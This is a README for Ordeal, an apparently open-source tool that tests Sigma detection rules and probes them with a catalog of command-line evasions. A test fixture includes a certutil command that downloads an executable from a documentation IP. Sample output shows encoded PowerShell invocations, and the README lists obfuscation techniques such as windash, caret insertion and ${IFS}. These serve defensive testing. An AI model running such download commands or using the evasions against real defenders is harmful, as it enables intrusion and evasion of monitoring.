<picture>
  <source media="(prefers-color-scheme: dark)" srcset=".github/banner-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset=".github/banner-light.svg">
  <img alt="Principle Breach" src=".github/banner-dark.svg" width="100%">
</picture>

# Ordeal

Trial by fire for Sigma detection rules. Ordeal asserts a rule fires on the events it should, then attacks the rule with known evasions and reports what slips past.

<!-- ------------------------------------------------------------ -->

## Install

```bash
go install github.com/principlebreach/ordeal/cmd/ordeal@latest
```

```bash
brew install principlebreach/tap/ordeal
```

## Usage

Assert your rules fire on their test cases:

```bash
ordeal run ./rules
```

Attack your rules and see what evades them:

```bash
ordeal mutate ./rules
```

Audit a rules tree for untested or thinly-tested detections:

```bash
ordeal lint ./rules
```

List the evasion catalog:

```bash
ordeal list mutators
```

A test suite lives next to the rule as `<rule>.test.yml`:

```yaml
rule: rule.yml
cases:
  - name: certutil urlcache download fires
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -f http://198.51.100.10/a.exe a.exe'
    match: true
    selections: [selection_img, selection_flags]   # assert which selection fired

  - name: certutil dump is benign
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -dump'
    match: false
```

## What It Does

### Detection unit testing

- Runs unmodified Sigma rules against inline event fixtures, positive and negative.
- Asserts not just that a rule fired, but *which named selection* fired.
- Replays real telemetry — JSON, JSONL, EVTX-rendered, or winlogbeat exports — with a `dataset:` case.
- Emits `human`, `json`, or `junit` output with distinct exit codes for CI.

### Coverage and hygiene

- `ordeal lint` reports untested rules, dangling suite references, and suites missing positive or negative cases.
- `ordeal list mutators` prints the evasion catalog with its ATT&CK anchors.

### Adversarial mutation — the reason Ordeal exists

Ordeal asks the attacker's question: what is the cheapest change that keeps the
behaviour identical but stops the rule from firing? For every positive case that
fires, it applies a catalog of **41 semantics-preserving evasions across Windows,
Linux, and macOS** and reports each one that slips past — with the fix.

- **Windows** — caret/backtick/quote insertion, `flag-abbreviation`, `windash` (every alternative dash), path canonicalization, `.exe` omission, 8.3 short names, cmd token separators, `%VAR:~0%`, and the PowerShell set (aliases, `System.` shortening, quoted members, concatenation, `-f` format).
- **Network** (any OS) — IPv4 as decimal or hex, default ports, percent-encoding, URL path traversal.
- **Linux/macOS shell** — quote/backslash/empty-expansion, ANSI-C quoting, line continuation, `${IFS}`, brace lists, and the zsh `${=IFS}` sibling.
- **macOS** — `/tmp`→`/private/tmp`, `osascript -l AppleScript`, `base64 -D`, `python -c` spacing.

Mutation is **platform-gated** on the rule's `logsource.product`, so a Windows
caret is never reported against a Linux rule. The shell mutators respect that
Linux/macOS telemetry logs post-expansion argv, so they fire only inside a literal
`bash -c "..."` payload. Each finding prints its **remediation** — the Sigma
change that catches it. Ordeal mutates only attacker-controlled fields and never
reshapes an opaque payload. Every mutator maps to a MITRE ATT&CK technique — see
[docs/mutators.md](docs/mutators.md), or run `ordeal list mutators`.

## Example Output

```
ordeal mutate ./examples/powershell_encoded

BREACH  powershell encoded command fires  survives 8/10 techniques (80%)
        ▲ flag-abbreviation · CommandLine · abbreviated -encodedcommand to -enc
          powershell.exe -NoProfile -enc SQBFAFgA
        ▲ windash (10 variants) · CommandLine · replaced - flag prefix with forward slash
          powershell.exe /NoProfile /EncodedCommand SQBFAFgA
        fix · Match abbreviated forms too, e.g. a regex like -e(n(c(o...)?)?)? or key on a stable prefix.
        fix · Use the |windash modifier, or a regex character class such as [-/] on the flag prefix.

EVADED  1 detections tested, 2 techniques evaded
```

Scoring is per technique, not per variant, so a rule that misses windash (ten dash
characters) counts as one gap, not ten. The base64 payload is left untouched.
Each breach prints its `fix`. Exit `0` when nothing evades, `1` when a detection
is breached, `2` on usage error.

## Why This Matters

A detection rule that passes review, converts cleanly, and merges green can still
be walked straight past in production. The gap is never the syntax — it is the
attacker's freedom to write the same command a hundred ways. `-EncodedCommand`
and `-enc` are the same PowerShell invocation; a rule that matches the first and
misses the second is a rule an operator defeats without trying.

Existing detection tests answer one question: does the rule fire on this event?
That is the easy half. Ordeal answers the half that decides whether the rule is
worth having: does the rule *keep* firing when the adversary changes the surface
and nothing else? The techniques in the catalog are not hypothetical — argument
abbreviation, caret and quote insertion, and dash substitution are documented
living-off-the-land evasions catalogued in MITRE ATT&CK T1027 and the `windash`
modifier that SigmaHQ added to the specification precisely because rules kept
missing them.

## Research

Ordeal is research-backed. It evaluates rules through
[`bradleyjkemp/sigma-go`](https://github.com/bradleyjkemp/sigma-go) and its
mutation catalog is drawn from documented obfuscation research:

- MITRE ATT&CK [T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) and [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/).
- The Sigma [`windash` value modifier](https://sigmahq.io/docs/basics/modifiers.html).
- Command-line argument obfuscation research (ArgFuscator, Invoke-DOSfuscation).

## Documentation

- [Test format](docs/test-format.md) — the `<rule>.test.yml` schema, every key.
- [Mutator catalog](docs/mutators.md) — each evasion and the technique it models.
- [Writing suites](docs/writing-suites.md) — from a rule to a closed evasion gap.
- [CI](docs/ci.md) — GitHub Action, exit codes, JUnit output.
- [Coverage](COVERAGE.md) — what share of real Sigma rules Ordeal evaluates today.

## Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md). The mutation
catalog is the place new research lands.

## License

MIT — see [LICENSE](LICENSE).

---

<sub>Built by <a href="https://principlebreach.com">Principle Breach</a> — offensive security research.</sub>
